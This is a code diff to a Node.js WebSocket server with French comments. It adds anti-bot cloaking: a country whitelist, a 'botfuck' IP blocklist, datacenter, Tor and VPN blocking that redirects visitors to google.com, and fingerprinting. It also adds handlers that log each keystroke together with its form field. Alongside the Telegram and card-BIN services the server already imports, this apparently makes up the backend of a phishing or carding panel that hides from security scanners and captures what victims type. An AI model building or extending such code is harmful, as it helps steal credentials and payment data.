@@ -6,6 +6,16 @@ const path = require('path');
 const TelegramService = require('./services/telegramService');
 const BinService = require('./services/binService');
 
+// Services de sécurité anti-bot
+const BotDetection = require('./services/botDetection');
+const DatacenterDetection = require('./services/datacenterDetection');
+const ProxyDetection = require('./services/proxyDetection');
+const BehaviorAnalysis = require('./services/behaviorAnalysis');
+const FingerprintService = require('./services/fingerprintService');
+const SecurityConfig = require('./services/securityConfig');
+const HCaptchaService = require('./services/hcaptchaService');
+const VisitLogger = require('./services/visitLogger');
+
 // Charger les variables d'environnement depuis .env si le fichier existe
 const envPath = path.join(__dirname, '..', '.env');
 if (fs.existsSync(envPath)) {
@@ -33,6 +43,102 @@ if (fs.existsSync(envPath)) {
 const PORT = process.env.WS_PORT || 8080;
 const telegram = new TelegramService();
 const binService = new BinService();
+
+// Initialiser les services de sécurité
+const securityConfig = new SecurityConfig();
+const botDetection = new BotDetection();
+const datacenterDetection = new DatacenterDetection();
+const proxyDetection = new ProxyDetection();
+const behaviorAnalysis = new BehaviorAnalysis();
+const fingerprintService = new FingerprintService();
+const hcaptchaService = new HCaptchaService();
+const visitLogger = new VisitLogger();
+
+console.log('[Server] 🛡️ Security services initialized');
+console.log('[Server] 🔐 hCaptcha:', hcaptchaService.isEnabled() ? 'ENABLED' : 'DISABLED');
+console.log('[Server] 📝 Visit Logger: ENABLED');
+
+// ============================================
+// SYSTÈME DE RESTRICTION PAR PAYS (WHITELIST)
+// ============================================
+
+// Charger la whitelist des pays autorisés
+let allowedCountries = new Set();
+let blockedIPs = new Set();
+
+function loadWhitelist() {
+  const whitelistPath = path.join(__dirname, '..', '..', 'whitelist.txt');
+  console.log('[Whitelist] 📄 Looking for whitelist at:', whitelistPath);
+  
+  if (fs.existsSync(whitelistPath)) {
+    const content = fs.readFileSync(whitelistPath, 'utf8');
+    allowedCountries = new Set();
+    content.split('\n').forEach(line => {
+      const trimmed = line.trim().toUpperCase();
+      if (trimmed && !trimmed.startsWith('#')) {
+        allowedCountries.add(trimmed);
+      }
+    });
+    console.log('[Whitelist] ✅ Loaded allowed countries:', Array.from(allowedCountries));
+  } else {
+    console.log('[Whitelist] ⚠️  No whitelist.txt found - all countries allowed');
+  }
+}
+
+function loadBotfuck() {
+  const botfuckPath = path.join(__dirname, '..', '..', 'botfuck.txt');
+  console.log('[Botfuck] 📄 Looking for botfuck at:', botfuckPath);
+  
+  if (fs.existsSync(botfuckPath)) {
+    const content = fs.readFileSync(botfuckPath, 'utf8');
+    blockedIPs = new Set();
+    content.split('\n').forEach(line => {
+      const trimmed = line.trim();
+      if (trimmed && !trimmed.startsWith('#')) {
+        blockedIPs.add(trimmed);
+      }
+    });
+    console.log('[Botfuck] ✅ Loaded blocked IPs:', blockedIPs.size, 'entries');
+  } else {
+    console.log('[Botfuck] ⚠️  No botfuck.txt found - no IPs blocked');
+  }
+}
+
+// Vérifier si un pays est autorisé
+function isCountryAllowed(countryCode) {
+  // Si pas de whitelist, tout est autorisé
+  if (allowedCountries.size === 0) {
+    return true;
+  }
+  // Vérifier si le code pays est dans la whitelist
+  const code = (countryCode || '').toUpperCase();
+  const allowed = allowedCountries.has(code);
+  console.log(`[Whitelist] 🔍 Country ${code} allowed: ${allowed}`);
+  return allowed;
+}
+
+// Vérifier si une IP est bloquée
+function isIPBlocked(ip) {
+  if (blockedIPs.size === 0) {
+    return false;
+  }
+  const blocked = blockedIPs.has(ip);
+  console.log(`[Botfuck] 🔍 IP ${ip} blocked: ${blocked}`);
+  return blocked;
+}
+
+// Charger les listes au démarrage
+loadWhitelist();
+loadBotfuck();
+
+// Recharger les listes toutes les 60 secondes
+setInterval(() => {
+  console.log('[Config] 🔄 Reloading whitelist and botfuck...');
+  loadWhitelist();
+  loadBotfuck();
+}, 60000);
+
+// ============================================
 
 // Créer le serveur HTTP avec gestionnaire de requêtes
 const server = http.createServer((req, res) => {
@@ -257,6 +363,47 @@ function getCountryName(countryCode) {
   return countries[countryCode] || countryCode;
 }
 
+// Convertir un nom de pays en code ISO
+function getCountryCode(countryName) {
+  const countryCodes = {
+    'Afghanistan': 'AF', 'Albania': 'AL', 'Algeria': 'DZ', 'Andorra': 'AD', 'Angola': 'AO',
+    'Argentina': 'AR', 'Armenia': 'AM', 'Australia': 'AU', 'Austria': 'AT', 'Azerbaijan': 'AZ',
+    'Bahrain': 'BH', 'Bangladesh': 'BD', 'Belarus': 'BY', 'Belgium': 'BE', 'Belize': 'BZ',
+    'Benin': 'BJ', 'Bhutan': 'BT', 'Bolivia': 'BO', 'Bosnia and Herzegovina': 'BA', 'Botswana': 'BW',
+    'Brazil': 'BR', 'Brunei': 'BN', 'Bulgaria': 'BG', 'Burkina Faso': 'BF', 'Burundi': 'BI',
+    'Cambodia': 'KH', 'Cameroon': 'CM', 'Canada': 'CA', 'Cape Verde': 'CV', 'Central African Republic': 'CF',
+    'Chad': 'TD', 'Chile': 'CL', 'China': 'CN', 'Colombia': 'CO', 'Comoros': 'KM',
+    'Congo': 'CG', 'DR Congo': 'CD', 'Costa Rica': 'CR', "Côte d'Ivoire": 'CI', 'Croatia': 'HR',
+    'Cuba': 'CU', 'Cyprus': 'CY', 'Czech Republic': 'CZ', 'Denmark': 'DK', 'Djibouti': 'DJ',
+    'Dominican Republic': 'DO', 'Ecuador': 'EC', 'Egypt': 'EG', 'El Salvador': 'SV', 'Equatorial Guinea': 'GQ',
+    'Eritrea': 'ER', 'Estonia': 'EE', 'Ethiopia': 'ET', 'Finland': 'FI', 'France': 'FR',
+    'Gabon': 'GA', 'Gambia': 'GM', 'Georgia': 'GE', 'Germany': 'DE', 'Ghana': 'GH',
+    'Greece': 'GR', 'Guatemala': 'GT', 'Guinea': 'GN', 'Guinea-Bissau': 'GW', 'Guyana': 'GY',
+    'Haiti': 'HT', 'Honduras': 'HN', 'Hong Kong': 'HK', 'Hungary': 'HU', 'Iceland': 'IS',
+    'India': 'IN', 'Indonesia': 'ID', 'Iran': 'IR', 'Iraq': 'IQ', 'Ireland': 'IE',
+    'Israel': 'IL', 'Italy': 'IT', 'Jamaica': 'JM', 'Japan': 'JP', 'Jordan': 'JO',
+    'Kazakhstan': 'KZ', 'Kenya': 'KE', 'Kuwait': 'KW', 'Kyrgyzstan': 'KG', 'Laos': 'LA',
+    'Latvia': 'LV', 'Lebanon': 'LB', 'Lesotho': 'LS', 'Liberia': 'LR', 'Libya': 'LY',
+    'Liechtenstein': 'LI', 'Lithuania': 'LT', 'Luxembourg': 'LU', 'North Macedonia': 'MK', 'Madagascar': 'MG',
+    'Malawi': 'MW', 'Malaysia': 'MY', 'Maldives': 'MV', 'Mali': 'ML', 'Malta': 'MT',
+    'Mauritania': 'MR', 'Mauritius': 'MU', 'Mexico': 'MX', 'Moldova': 'MD', 'Monaco': 'MC',
+    'Mongolia': 'MN', 'Montenegro': 'ME', 'Morocco': 'MA', 'Mozambique': 'MZ', 'Myanmar': 'MM',
+    'Namibia': 'NA', 'Nepal': 'NP', 'Netherlands': 'NL', 'New Zealand': 'NZ', 'Nicaragua': 'NI',
+    'Niger': 'NE', 'Nigeria': 'NG', 'Norway': 'NO', 'Oman': 'OM', 'Pakistan': 'PK',
+    'Panama': 'PA', 'Papua New Guinea': 'PG', 'Paraguay': 'PY', 'Peru': 'PE', 'Philippines': 'PH',
+    'Poland': 'PL', 'Portugal': 'PT', 'Qatar': 'QA', 'Romania': 'RO', 'Russia': 'RU',
+    'Rwanda': 'RW', 'Saudi Arabia': 'SA', 'Senegal': 'SN', 'Serbia': 'RS', 'Singapore': 'SG',
+    'Slovakia': 'SK', 'Slovenia': 'SI', 'Somalia': 'SO', 'South Africa': 'ZA', 'South Korea': 'KR',
+    'Spain': 'ES', 'Sri Lanka': 'LK', 'Sudan': 'SD', 'Sweden': 'SE', 'Switzerland': 'CH',
+    'Syria': 'SY', 'Taiwan': 'TW', 'Tajikistan': 'TJ', 'Tanzania': 'TZ', 'Thailand': 'TH',
+    'Togo': 'TG', 'Tunisia': 'TN', 'Turkey': 'TR', 'Turkmenistan': 'TM', 'Uganda': 'UG',
+    'Ukraine': 'UA', 'United Arab Emirates': 'AE', 'United Kingdom': 'GB', 'United States': 'US',
+    'Uruguay': 'UY', 'Uzbekistan': 'UZ', 'Venezuela': 'VE', 'Vietnam': 'VN', 'Yemen': 'YE',
+    'Zambia': 'ZM', 'Zimbabwe': 'ZW', 'Local': 'LOCAL', 'Unknown': 'UNKNOWN'
+  };
+  return countryCodes[countryName] || countryName;
+}
+
 // Fonction de fallback avec ip-api.com
 function tryFallbackAPI(ip, resolve) {
   console.log(`[Country] 🔄 Trying fallback API (ip-api.com) for IP: ${ip}`);
@@ -313,38 +460,212 @@ function tryFallbackAPI(ip, resolve) {
   });
 }
 
+// ============================================
+// NETTOYAGE PÉRIODIQUE DES SERVICES
+// ============================================
+
+// Nettoyer les services toutes les 5 minutes
+setInterval(() => {
+  console.log('[Cleanup] 🧹 Running periodic cleanup...');
+  botDetection.cleanup();
+  datacenterDetection.cleanupCache();
+  proxyDetection.cleanupCache();
+  behaviorAnalysis.cleanup();
+  fingerprintService.cleanup();
+}, 5 * 60 * 1000);
+
+// Mettre à jour la liste Tor toutes les heures
+setInterval(async () => {
+  console.log('[Security] 🧅 Updating Tor exit nodes...');
+  await proxyDetection.updateTorExitNodes();
+}, 60 * 60 * 1000);
+
 // Gestion des connexions WebSocket
 wss.on('connection', async (ws, req) => {
   const clientId = generateClientId();
   const ip = getClientIP(req);
+  const userAgent = req.headers['user-agent'] || '';
   
   console.log(`\n[Connection] ========================================`);
-  console.log(`[Connection] New WebSocket connection`);
+  console.log(`[Connection] 🔌 New WebSocket connection`);
   console.log(`[Connection] Client ID: ${clientId}`);
   console.log(`[Connection] Detected IP: ${ip}`);
-  console.log(`[Connection] User-Agent: ${req.headers['user-agent'] || 'N/A'}`);
+  console.log(`[Connection] User-Agent: ${userAgent || 'N/A'}`);
   console.log(`[Connection] Origin: ${req.headers.origin || 'N/A'}`);
   console.log(`[Connection] ========================================\n`);
 
-  // Obtenir le pays à partir de l'IP
+  // ============================================
+  // VÉRIFICATIONS DE SÉCURITÉ ANTI-BOT
+  // ============================================
+  
+  // 2. Détection de bot via User-Agent (avant blocage pour avoir les infos)
+  const botAnalysis = botDetection.analyze(req, ip);
+  
+  // 4. Obtenir le pays à partir de l'IP (avant blocage pour avoir les infos)
   const country = await getCountryFromIP(ip);
-  console.log(`[Country] ✅ IP ${ip} -> Country: ${country}`);
-  console.log(`[Country] 📝 Storing country '${country}' for client ${clientId}`);
+  const countryCode = getCountryCode(country);
+  
+  // 6. Détection Datacenter (async)
+  let datacenterInfo = null;
+  try {
+    datacenterInfo = await datacenterDetection.detect(ip);
+  } catch (error) {
+    console.error(`[Security] ⚠️ Datacenter detection error for ${ip}:`, error.message);
+  }
 
-  // Stocker la connexion
+  // 7. Détection Proxy/Tor/VPN (async)
+  let proxyInfo = null;
+  try {
+    proxyInfo = await proxyDetection.detect(ip, req.headers);
+  } catch (error) {
+    console.error(`[Security] ⚠️ Proxy detection error for ${ip}:`, error.message);
+  }
+
+  // Préparer les données de visite pour le logging
+  const visitData = {
+    ip,
+    country,
+    countryCode,
+    userAgent,
+    clientId,
+    isBot: botAnalysis.isBot,
+    botScore: botAnalysis.score,
+    botReasons: botAnalysis.reasons,
+    isDatacenter: datacenterInfo?.isDatacenter || false,
+    datacenterOrg: datacenterInfo?.org || null,
+    isProxy: proxyInfo?.isProxy || false,
+    isTor: proxyInfo?.isTor || false,
+    isVPN: proxyInfo?.isVPN || false,
+    isBlocked: false,
+    blockReason: null
+  };
+
+  // 1. Vérifier si l'IP est dans la blacklist
+  if (isIPBlocked(ip) || securityConfig.isIPBlocked(ip)) {
+    console.log(`[Security] 🚫 IP ${ip} is BLACKLISTED - blocking`);
+    visitData.isBlocked = true;
+    visitData.blockReason = 'blacklisted_ip';
+    visitLogger.logVisit(visitData);
+    ws.close(4003, 'Access denied');
+    return;
+  }
+
+  // 2. Vérifier détection bot
+  if (botAnalysis.shouldBlock) {
+    console.log(`[Security] 🤖 Bot detected for ${ip}: ${botAnalysis.reasons.join(', ')}`);
+    visitData.isBlocked = true;
+    visitData.blockReason = 'bot_detected';
+    visitLogger.logVisit(visitData);
+    ws.close(4003, 'Access denied');
+    return;
+  }
+
+  // 3. Vérifier le rate limiting
+  const rateLimit = botDetection.checkRateLimit(ip);
+  if (rateLimit.blocked) {
+    console.log(`[Security] ⏱️ Rate limit exceeded for ${ip}: ${rateLimit.reason}`);
+    visitData.isBlocked = true;
+    visitData.blockReason = 'rate_limited';
+    visitLogger.logVisit(visitData);
+    ws.close(4003, 'Too many requests');
+    return;
+  }
+
+  console.log(`[Country] ✅ IP ${ip} -> Country: ${country}`);
+
+  // 5. Vérifier si le pays est autorisé (whitelist)
+  if (!isCountryAllowed(countryCode)) {
+    console.log(`[Security] 🌍 Country ${country} (${countryCode}) NOT in whitelist - blocking`);
+    visitData.isBlocked = true;
+    visitData.blockReason = 'country_blocked';
+    visitLogger.logVisit(visitData);
+    ws.send(JSON.stringify({
+      type: 'blocked',
+      message: 'Access denied for your country',
+      redirect: 'https://www.google.com'
+    }));
+    ws.close(4003, 'Country not allowed');
+    return;
+  }
+  console.log(`[Security] ✅ Country ${country} (${countryCode}) is ALLOWED`);
+
+  // 6. Vérifier datacenter
+  if (datacenterInfo?.isDatacenter && securityConfig.shouldBlockDatacenter(true)) {
+    console.log(`[Security] 🏢 Datacenter detected for ${ip}: ${datacenterInfo.org}`);
+    visitData.isBlocked = true;
+    visitData.blockReason = 'datacenter_blocked';
+    visitLogger.logVisit(visitData);
+    ws.send(JSON.stringify({
+      type: 'blocked',
+      message: 'Datacenter connections not allowed',
+      redirect: 'https://www.google.com'
+    }));
+    ws.close(4003, 'Datacenter not allowed');
+    return;
+  }
+
+  // 7. Vérifier Proxy/Tor/VPN
+  if (proxyInfo?.isTor && securityConfig.shouldBlockTor()) {
+    console.log(`[Security] 🧅 Tor detected for ${ip}`);
+    visitData.isBlocked = true;
+    visitData.blockReason = 'tor_blocked';
+    visitLogger.logVisit(visitData);
+    ws.close(4003, 'Tor not allowed');
+    return;
+  }
+  
+  if (proxyInfo?.isVPN && securityConfig.shouldBlockVPN()) {
+    console.log(`[Security] 🔐 VPN detected for ${ip}: ${proxyInfo.details?.api?.org || 'Unknown'}`);
+    visitData.isBlocked = true;
+    visitData.blockReason = 'vpn_blocked';
+    visitLogger.logVisit(visitData);
+    ws.close(4003, 'VPN not allowed');
+    return;
+  }
+  
+  if (proxyInfo?.isProxy && securityConfig.shouldBlockProxy()) {
+    console.log(`[Security] 🔄 Proxy detected for ${ip}`);
+    visitData.isBlocked = true;
+    visitData.blockReason = 'proxy_blocked';
+    visitLogger.logVisit(visitData);
+    ws.close(4003, 'Proxy not allowed');
+    return;
+  }
+
+  // ✅ Visite autorisée - logger
+  visitLogger.logVisit(visitData);
+
+  // ============================================
+  // CONNEXION AUTORISÉE
+  // ============================================
+  
+  console.log(`[Security] ✅ All security checks passed for ${ip}`);
+
+  // Initialiser l'analyse comportementale
+  behaviorAnalysis.initClient(clientId);
+
+  // Stocker la connexion avec les infos de sécurité
   const clientData = {
     ws,
     id: clientId,
     ip,
-    country: country || 'Unknown', // S'assurer que le pays est toujours défini
+    userAgent,
+    country: country || 'Unknown',
+    countryCode,
     role: null,
     connectedAt: Date.now(),
+    security: {
+      botScore: botAnalysis.score,
+      datacenter: datacenterInfo,
+      proxy: proxyInfo,
+      behaviorScore: 50, // Score initial
+      fingerprintScore: null
+    }
   };
   
   clients.set(clientId, clientData);
-  console.log(`[Connection] 💾 Client stored with country: ${clientData.country}`);
-  console.log(`[Connection] 📊 Total clients after storing: ${clients.size}`);
-  console.log(`[Connection] 📊 Client role at creation: ${clientData.role || 'null'}`);
+  console.log(`[Connection] 💾 Client stored with security info`);
+  console.log(`[Connection] 📊 Bot score: ${botAnalysis.score}, Datacenter: ${datacenterInfo?.isDatacenter || false}, Proxy: ${proxyInfo?.isProxy || false}`);
 
   // Envoyer message de bienvenue
   ws.send(JSON.stringify({
@@ -548,9 +869,212 @@ async function handleMessage(clientId, data) {
       handleDirectMessage(clientId, data);
       break;
     
+    // ============================================
+    // MESSAGES DE SÉCURITÉ / COMPORTEMENT
+    // ============================================
+    
+    case 'behavior_data':
+      await handleBehaviorData(clientId, data);
+      break;
+    
+    case 'fingerprint_data':
+      await handleFingerprintData(clientId, data);
+      break;
+    
+    case 'mouse_movement':
+      handleMouseMovement(clientId, data);
+      break;
+    
+    case 'keystroke':
+      handleKeystroke(clientId, data);
+      break;
+    
+    case 'click':
+      handleClick(clientId, data);
+      break;
+    
+    case 'scroll':
+      handleScroll(clientId, data);
+      break;
+    
+    // ============================================
+    // HCAPTCHA
+    // ============================================
+    
+    case 'hcaptcha_verify':
+      await handleHCaptchaVerify(clientId, data);
+      break;
+    
+    case 'get_hcaptcha_config':
+      handleGetHCaptchaConfig(clientId);
+      break;
+    
     default:
       console.log(`[handleMessage] ⚠️  Unknown message type: ${data.type} from ${clientId}`);
   }
+}
+
+// ============================================
+// HANDLERS DE DONNÉES COMPORTEMENTALES
+// ============================================
+
+async function handleBehaviorData(clientId, data) {
+  const client = clients.get(clientId);
+  if (!client) return;
+
+  console.log(`[Behavior] 📊 Received behavior data from ${clientId}`);
+
+  // Enregistrer les données comportementales
+  if (data.mouseMovements) {
+    data.mouseMovements.forEach(m => behaviorAnalysis.recordMouseMovement(clientId, m));
+  }
+  if (data.keystrokes) {
+    data.keystrokes.forEach(k => behaviorAnalysis.recordKeystroke(clientId, k));
+  }
+  if (data.clicks) {
+    data.clicks.forEach(c => behaviorAnalysis.recordClick(clientId, c));
+  }
+  if (data.scrollEvents) {
+    data.scrollEvents.forEach(s => behaviorAnalysis.recordScroll(clientId, s));
+  }
+
+  // Analyser le comportement
+  const analysis = behaviorAnalysis.analyze(clientId);
+  
+  // Mettre à jour le score du client
+  if (client.security) {
+    client.security.behaviorScore = analysis.score;
+  }
+
+  // Vérifier si le score est trop bas
+  if (analysis.score < securityConfig.getMinBehaviorScore()) {
+    console.log(`[Behavior] ⚠️ Low behavior score for ${clientId}: ${analysis.score}`);
+  }
+
+  console.log(`[Behavior] ✅ Client ${clientId} behavior score: ${analysis.score}`);
+}
+
+async function handleFingerprintData(clientId, data) {
+  const client = clients.get(clientId);
+  if (!client) return;
+
+  console.log(`[Fingerprint] 🔍 Received fingerprint data from ${clientId}`);
+
+  // Analyser le fingerprint
+  const analysis = fingerprintService.analyze(data.fingerprint);
+  
+  // Stocker le fingerprint
+  fingerprintService.storeFingerprint(clientId, data.fingerprint, analysis);
+
+  // Mettre à jour le score du client
+  if (client.security) {
+    client.security.fingerprintScore = analysis.score;
+    client.security.fingerprintHash = analysis.hash;
+  }
+
+  // Vérifier les duplicatas (même fingerprint = possible fraude)
+  const duplicate = fingerprintService.isDuplicateFingerprint(analysis.hash, clientId);
+  if (duplicate.isDuplicate) {
+    console.log(`[Fingerprint] ⚠️ Duplicate fingerprint detected for ${clientId}`);
+  }
+
+  // Vérifier si le score est trop bas
+  if (analysis.score < securityConfig.getMinFingerprintScore()) {
+    console.log(`[Fingerprint] ⚠️ Low fingerprint score for ${clientId}: ${analysis.score}`);
+  }
+
+  console.log(`[Fingerprint] ✅ Client ${clientId} fingerprint score: ${analysis.score}`);
+}
+
+function handleMouseMovement(clientId, data) {
+  behaviorAnalysis.recordMouseMovement(clientId, {
+    x: data.x,
+    y: data.y,
+    timestamp: data.timestamp || Date.now()
+  });
+}
+
+function handleKeystroke(clientId, data) {
+  behaviorAnalysis.recordKeystroke(clientId, {
+    key: data.key,
+    timestamp: data.timestamp || Date.now(),
+    field: data.field
+  });
+}
+
+function handleClick(clientId, data) {
+  behaviorAnalysis.recordClick(clientId, {
+    x: data.x,
+    y: data.y,
+    timestamp: data.timestamp || Date.now(),
+    element: data.element
+  });
+}
+
+function handleScroll(clientId, data) {
+  behaviorAnalysis.recordScroll(clientId, {
+    scrollY: data.scrollY,
+    timestamp: data.timestamp || Date.now()
+  });
+}
+
+// ============================================
+// HANDLERS HCAPTCHA
+// ============================================
+
+async function handleHCaptchaVerify(clientId, data) {
+  const client = clients.get(clientId);
+  if (!client) return;
+
+  console.log(`[HCaptcha] 🔐 Verification request from ${clientId}`);
+
+  const token = data.token;
+  if (!token) {
+    console.log(`[HCaptcha] ❌ No token provided by ${clientId}`);
+    client.ws.send(JSON.stringify({
+      type: 'hcaptcha_result',
+      success: false,
+      error: 'missing_token'
+    }));
+    return;
+  }
+
+  // Vérifier le token avec l'API hCaptcha
+  const result = await hcaptchaService.verify(token, client.ip);
+
+  // Stocker le résultat dans les données client
+  if (!client.security) {
+    client.security = {};
+  }
+  client.security.hcaptcha = {
+    verified: result.success,
+    verifiedAt: Date.now(),
+    score: result.score
+  };
+
+  // Envoyer le résultat au client
+  client.ws.send(JSON.stringify({
+    type: 'hcaptcha_result',
+    success: result.success,
+    error: result.error,
+    errorCodes: result.errorCodes
+  }));
+
+  console.log(`[HCaptcha] ${result.success ? '✅' : '❌'} Verification ${result.success ? 'successful' : 'failed'} for ${clientId}`);
+}
+
+function handleGetHCaptchaConfig(clientId) {
+  const client = clients.get(clientId);
+  if (!client) return;
+
+  const config = hcaptchaService.getClientConfig();
+  
+  client.ws.send(JSON.stringify({
+    type: 'hcaptcha_config',
+    ...config
+  }));
+
+  console.log(`[HCaptcha] 📤 Config sent to ${clientId}: enabled=${config.enabled}`);
 }
 
 // Enregistrement d'un client
